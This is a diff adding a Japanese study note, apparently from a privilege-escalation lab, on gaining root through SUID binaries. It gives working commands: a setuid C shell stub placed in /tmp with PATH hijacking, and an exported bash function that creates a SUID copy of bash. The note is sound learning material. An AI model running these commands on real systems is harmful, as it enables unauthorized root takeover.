@@ -1,0 +1,51 @@
+strings /usr/bin/local/suid-env
+でバイナリ（実行ファイル）内の読める文字を抽出
+その中には、ごみデータと関数とパスなどがある。
+今回はその中にsystem関数があること、service apache2 startの文字があることに着目
+
+そもそもsystem関数はPATH環境を参照して「service」という名前のコマンドを探している。
+system("service apache2 start")は攻撃者が「service」という名前のコマンドを偽装できてしまう。
+　→「service」コマンドを絶対パスで指定していないため、偽装が可能になる。
+
+そこで自身を①rootに偽装するスクリプト/tmp（誰でも編集可能なため）を作り（serviceという名前）、
+②PATHを/tmpから読み込ませるよう指定し、/usr/bin/local/suid-envを実行するとrootが取れるようになる
+
+①
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
+
+②
+export PATH=/tmp:$PATH
+
+
+
+stringsで関数を調べたとき、system関数のPATHが絶対パスになっていた場合
+
+function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+
+functionコマンドでbashをコピーしてbash -pによる「権限を落とす安全装置を無視した起動」をする。
+
+export -f /usr/sbin/service
+  →export -fをして、子プロセスに/usr/sbin/serviceを覚えさせる
+   (プログラムの中で、service コマンドの場所をハッキリ指定して教えておく)
+
+/usr/local/bin/suid-env2　
+
+上記はstringsで確認したようにsysytem関数を使用したものとなっているため、上記コマンドを打つと間接的にbashが起動される。そのため。export -fが効いてくる。
+  →suid-env2 は root権限で system() を実行する SUIDバイナリ
+    →system() は /bin/sh を起動する
+      →/bin/sh は 環境変数（特に関数 export）を読み込む
+☆suid-env2 を実行すると、root権限で bash が裏で起動し、その bash がユーザーの環境変数を読み込んでしまう。
+
+
+以上により、root侵入が可能になる
+
+bashが稼働するのは大まかに3つある。
+
+bash が出てくる場面	    見える？	    どういうとき？
+① 自分で bash を起動	    見える      	普通の操作
+② system() が内部で起動	見えない	    SUID バイナリがコマンドを実行するとき
+③ スクリプト内部で起動	  見えない	    #!/bin/bash のとき
+
+⇒“見えない bash” が root 権限で動くときが最も危険
+
+
